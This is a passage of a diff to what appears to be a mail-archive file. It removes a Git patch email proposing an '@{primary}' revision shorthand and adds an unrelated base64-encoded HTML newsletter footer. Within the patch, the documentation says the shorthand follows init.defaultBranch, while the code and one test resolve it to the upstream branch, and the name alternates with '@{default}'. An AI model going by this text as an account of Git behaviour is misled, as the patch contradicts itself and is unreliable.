+b3I6ICM2NjY7IHRleHQtYWxpZ246IGNlbnRlcjsiPgogICAgICAgICAgICA8cCBzdHlsZT0ibWFy
+Z2luOiA1cHggMDsiPlRoaXMgaXMgYSBwcm9mZXNzaW9uYWwgYnVzaW5lc3MgY29tbXVuaWNhdGlv
+bi48L3A+CiAgICAgICAgICAgIDxwIHN0eWxlPSJtYXJnaW46IDVweCAwOyI+CiAgICAgICAgICAg
+ICAgICA8YSBocmVmPSJtYWlsdG86dW5zdWJzY3JpYmVAdG9raWEuY28uanA/c3ViamVjdD1VbnN1
+YnNjcmliZSIgc3R5bGU9ImNvbG9yOiAjNjY2OyB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsi
+PlVuc3Vic2NyaWJlPC9hPiB8IAogICAgICAgICAgICAgICAgPGEgaHJlZj0ibWFpbHRvOnByZWZl
+cmVuY2VzQHRva2lhLmNvLmpwP3N1YmplY3Q9TWFuYWdlIFByZWZlcmVuY2VzIiBzdHlsZT0iY29s
+b3I6ICM2NjY7IHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyI+TWFuYWdlIFByZWZlcmVuY2Vz
+PC9hPgogICAgICAgICAgICA8L3A+CiAgICAgICAgICAgIDxwIHN0eWxlPSJtYXJnaW46IDVweCAw
+OyBmb250LXNpemU6IDEwcHg7Ij5CdXNpbmVzcyBDb21tdW5pY2F0aW9uIOKAoiBQcm9mZXNzaW9u
+YWwgU2VydmljZXM8L3A+CiAgICAgICAgPC9kaXY+CiAgICAgICAg
 
-instead of having to know or look up the primary branch name.
+--===============0807376524191923686==--
 
-The implementation follows the same pattern as @{upstream} and @{push},
-using a new branch_get_primary_ref() function that queries the primary
-branch name and verifies it exists in the repository.
-
-Signed-off-by: Harald Nordgren <haraldnordgren@gmail.com>
----
-    revisions: add @{default} shorthand for default branch
-    
-    cc: "Kristoffer Haugsbakk" kristofferhaugsbakk@fastmail.com
-
-Published-As: https://github.com/gitgitgadget/git/releases/tag/pr-git-2183%2FHaraldNordgren%2Fdefault_shorthand-v4
-Fetch-It-Via: git fetch https://github.com/gitgitgadget/git pr-git-2183/HaraldNordgren/default_shorthand-v4
-Pull-Request: https://github.com/git/git/pull/2183
-
-Range-diff vs v3:
-
- 1:  0fc9eb75ea ! 1:  cfad3c3197 revisions: add @{primary} shorthand for primary branch
-     @@ object-name.c: static int branch_interpret_allowed(const char *refname, unsigned
-      +static const char *branch_get_primary_mark(struct branch *branch,
-      +					   struct strbuf *err)
-      +{
-     -+	return branch_get_primary_ref(branch, err);
-     ++	return branch_get_upstream_options(branch, err, 1);
-      +}
-      +
-       static int interpret_branch_mark(struct repository *r,
-     @@ remote.c: const char *branch_get_upstream(struct branch *branch, struct strbuf *
-       }
-       
-       static const char *tracking_for_push_dest(struct remote *remote,
-     -@@ remote.c: const char *branch_get_push(struct branch *branch, struct strbuf *err)
-     - 	return branch->push_tracking_ref;
-     - }
-     - 
-     -+const char *branch_get_primary_ref(struct branch *branch, struct strbuf *err)
-     -+{
-     -+	return branch_get_upstream_options(branch, err, 1);
-     -+}
-     -+
-     - static int ignore_symref_update(const char *refname, struct strbuf *scratch)
-     - {
-     - 	return !refs_read_symbolic_ref(get_main_ref_store(the_repository), refname, scratch);
-      
-       ## remote.h ##
-      @@ remote.h: int branch_has_merge_config(struct branch *branch);
-     @@ remote.h: int branch_has_merge_config(struct branch *branch);
-       /**
-        * Return the fully-qualified refname of the tracking branch for `branch`.
-        * I.e., what "branch@{upstream}" would give you. Returns NULL if no
-     -@@ remote.h: const char *branch_get_upstream(struct branch *branch, struct strbuf *err);
-     -  */
-     - const char *branch_get_push(struct branch *branch, struct strbuf *err);
-     - 
-     -+/**
-     -+ * Return the fully-qualified refname of the primary branch.
-     -+ * I.e., what "@{primary}" would give you.
-     -+ */
-     -+const char *branch_get_primary_ref(struct branch *branch, struct strbuf *err);
-     -+
-     - /* Flags to match_refs. */
-     - enum match_refs_flags {
-     - 	MATCH_REFS_NONE		= 0,
-      
-       ## t/t1507-rev-parse-upstream.sh ##
-      @@ t/t1507-rev-parse-upstream.sh: test_expect_success 'log -g other@{u}@{now}' '
-     @@ t/t6040-tracking-info.sh: test_expect_success 'checkout (up-to-date with upstrea
-       	test_grep "Your branch is up to date with .origin/main" actual
-       '
-       
-     -+test_expect_success 'checkout @{primary} (up-to-date with upstream)' '
-     ++test_expect_success 'checkout @{primary} same as checkout main' '
-      +	(
-      +		cd test &&
-      +		git checkout b6 &&
-     @@ t/t6040-tracking-info.sh: test_expect_success 'checkout (up-to-date with upstrea
-      +	test_cmp expect actual
-      +'
-      +
-     -+test_expect_success 'status from @{primary} (up-to-date with upstream)' '
-     ++test_expect_success 'status from @{primary} same as status from main' '
-      +	(
-      +		cd test &&
-      +		git checkout @{primary} &&
-
-
- Documentation/revisions.adoc  | 17 +++++++++++++++++
- object-name.c                 | 21 ++++++++++++++++++++-
- remote.c                      | 22 ++++++++++++++++++++--
- remote.h                      |  3 +++
- t/t1507-rev-parse-upstream.sh |  6 ++++++
- t/t1508-at-combinations.sh    |  1 +
- t/t6040-tracking-info.sh      | 27 +++++++++++++++++++++++++++
- 7 files changed, 94 insertions(+), 3 deletions(-)
-
-diff --git a/Documentation/revisions.adoc b/Documentation/revisions.adoc
-index 6ea6c7cead..d5c98bfdb1 100644
---- a/Documentation/revisions.adoc
-+++ b/Documentation/revisions.adoc
-@@ -149,6 +149,23 @@ from one location and push to another. In a non-triangular workflow,
- This suffix is also accepted when spelled in uppercase, and means the same
- thing no matter the case.
- 
-+'@\{primary\}'::
-+  The suffix '@\{primary}' refers to the primary branch of the repository,
-+  typically `main` or `master`. This is determined by the `init.defaultBranch`
-+  configuration option, or falls back to `main` (or `master` in older Git
-+  versions) if not configured. The primary branch must exist in the repository
-+  for this syntax to work.
-++
-+Here's an example:
-++
-+------------------------------
-+$ git checkout @{primary}
-+Switched to branch 'main'
-+
-+$ git rev-parse --symbolic-full-name @{primary}
-+refs/heads/main
-+------------------------------
-+
- '<rev>{caret}[<n>]', e.g. 'HEAD{caret}, v1.5.1{caret}0'::
-   A suffix '{caret}' to a revision parameter means the first parent of
-   that commit object.  '{caret}<n>' means the <n>th parent (i.e.
-diff --git a/object-name.c b/object-name.c
-index 8b862c124e..6d38df2f08 100644
---- a/object-name.c
-+++ b/object-name.c
-@@ -947,6 +947,12 @@ static inline int push_mark(const char *string, int len)
- 	return at_mark(string, len, suffix, ARRAY_SIZE(suffix));
- }
- 
-+static inline int primary_mark(const char *string, int len)
-+{
-+	const char *suffix[] = { "@{primary}" };
-+	return at_mark(string, len, suffix, ARRAY_SIZE(suffix));
-+}
-+
- static enum get_oid_result get_oid_1(struct repository *r, const char *name, int len, struct object_id *oid, unsigned lookup_flags);
- static int interpret_nth_prior_checkout(struct repository *r, const char *name, int namelen, struct strbuf *buf);
- 
-@@ -998,7 +1004,8 @@ static int get_oid_basic(struct repository *r, const char *str, int len,
- 					continue;
- 				}
- 				if (!upstream_mark(str + at, len - at) &&
--				    !push_mark(str + at, len - at)) {
-+				    !push_mark(str + at, len - at) &&
-+				    !primary_mark(str + at, len - at)) {
- 					reflog_len = (len-1) - (at+2);
- 					len = at;
- 				}
-@@ -1707,6 +1714,12 @@ static int branch_interpret_allowed(const char *refname, unsigned allowed)
- 	return 0;
- }
- 
-+static const char *branch_get_primary_mark(struct branch *branch,
-+					   struct strbuf *err)
-+{
-+	return branch_get_upstream_options(branch, err, 1);
-+}
-+
- static int interpret_branch_mark(struct repository *r,
- 				 const char *name, int namelen,
- 				 int at, struct strbuf *buf,
-@@ -1798,6 +1811,12 @@ int repo_interpret_branch_name(struct repository *r,
- 					    options);
- 		if (len > 0)
- 			return len;
-+
-+		len = interpret_branch_mark(r, name, namelen, at - name, buf,
-+					    primary_mark, branch_get_primary_mark,
-+					    options);
-+		if (len > 0)
-+			return len;
- 	}
- 
- 	return -1;
-diff --git a/remote.c b/remote.c
-index b756ff6f15..2316dfea07 100644
---- a/remote.c
-+++ b/remote.c
-@@ -1842,8 +1842,12 @@ static const char *error_buf(struct strbuf *err, const char *fmt, ...)
- 	return NULL;
- }
- 
--const char *branch_get_upstream(struct branch *branch, struct strbuf *err)
-+const char *branch_get_upstream_options(struct branch *branch, struct strbuf *err,
-+					int omit_remote)
- {
-+	static struct strbuf upstream_branch_buf = STRBUF_INIT;
-+	const char *dst;
-+
- 	if (!branch)
- 		return error_buf(err, _("HEAD does not point to a branch"));
- 
-@@ -1866,7 +1870,21 @@ const char *branch_get_upstream(struct branch *branch, struct strbuf *err)
- 				 _("upstream branch '%s' not stored as a remote-tracking branch"),
- 				 branch->merge[0]->src);
- 
--	return branch->merge[0]->dst;
-+	dst = branch->merge[0]->dst;
-+	if (!omit_remote)
-+		return dst;
-+
-+	strbuf_reset(&upstream_branch_buf);
-+	if (skip_prefix(dst, "refs/remotes/", &dst) && (dst = strchr(dst, '/')))
-+		strbuf_addf(&upstream_branch_buf, "refs/heads/%s", dst + 1);
-+	else
-+		strbuf_addstr(&upstream_branch_buf, branch->merge[0]->dst);
-+	return upstream_branch_buf.buf;
-+}
-+
-+const char *branch_get_upstream(struct branch *branch, struct strbuf *err)
-+{
-+	return branch_get_upstream_options(branch, err, 0);
- }
- 
- static const char *tracking_for_push_dest(struct remote *remote,
-diff --git a/remote.h b/remote.h
-index 0ca399e183..879be2162c 100644
---- a/remote.h
-+++ b/remote.h
-@@ -347,6 +347,9 @@ int branch_has_merge_config(struct branch *branch);
- 
- int branch_merge_matches(struct branch *, int n, const char *);
- 
-+const char *branch_get_upstream_options(struct branch *branch, struct strbuf *err,
-+					int omit_remote);
-+
- /**
-  * Return the fully-qualified refname of the tracking branch for `branch`.
-  * I.e., what "branch@{upstream}" would give you. Returns NULL if no
-diff --git a/t/t1507-rev-parse-upstream.sh b/t/t1507-rev-parse-upstream.sh
-index cb9ef7e329..27b45442c2 100755
---- a/t/t1507-rev-parse-upstream.sh
-+++ b/t/t1507-rev-parse-upstream.sh
-@@ -259,6 +259,12 @@ test_expect_success 'log -g other@{u}@{now}' '
- 	test_cmp expect actual
- '
- 
-+test_expect_success '@{primary} resolves to correct full name' '
-+	echo refs/heads/main >expect &&
-+	git -C clone rev-parse --symbolic-full-name @{primary} >actual &&
-+	test_cmp expect actual
-+'
-+
- test_expect_success '@{reflog}-parsing does not look beyond colon' '
- 	echo content >@{yesterday} &&
- 	git add @{yesterday} &&
-diff --git a/t/t1508-at-combinations.sh b/t/t1508-at-combinations.sh
-index 87a4286414..88bf625c74 100755
---- a/t/t1508-at-combinations.sh
-+++ b/t/t1508-at-combinations.sh
-@@ -69,6 +69,7 @@ check "@{-1}@{u}" ref refs/heads/main
- check "@{-1}@{u}@{1}" commit main-one
- check "@" commit new-two
- check "@@{u}" ref refs/heads/upstream-branch
-+check "@{primary}" ref refs/heads/upstream-branch
- check "@@/at-test" ref refs/heads/@@/at-test
- test_have_prereq MINGW ||
- check "@/at-test" ref refs/heads/@/at-test
-diff --git a/t/t6040-tracking-info.sh b/t/t6040-tracking-info.sh
-index 0b719bbae6..b42d56d438 100755
---- a/t/t6040-tracking-info.sh
-+++ b/t/t6040-tracking-info.sh
-@@ -106,6 +106,33 @@ test_expect_success 'checkout (up-to-date with upstream)' '
- 	test_grep "Your branch is up to date with .origin/main" actual
- '
- 
-+test_expect_success 'checkout @{primary} same as checkout main' '
-+	(
-+		cd test &&
-+		git checkout b6 &&
-+		git checkout @{primary} >../actual
-+	) &&
-+	cat >expect <<-EOF &&
-+	Your branch is up to date with ${SQ}origin/main${SQ}.
-+	EOF
-+	test_cmp expect actual
-+'
-+
-+test_expect_success 'status from @{primary} same as status from main' '
-+	(
-+		cd test &&
-+		git checkout @{primary} &&
-+		git status >../actual
-+	) &&
-+	cat >expect <<-EOF &&
-+	On branch main
-+	Your branch is up to date with ${SQ}origin/main${SQ}.
-+
-+	nothing to commit, working tree clean
-+	EOF
-+	test_cmp expect actual
-+'
-+
- test_expect_success 'status (diverged from upstream)' '
- 	(
- 		cd test &&
-
-base-commit: ea717645d199f6f1b66058886475db3e8c9330e9
--- 
-gitgitgadget
+--===============1842154033582965411==--
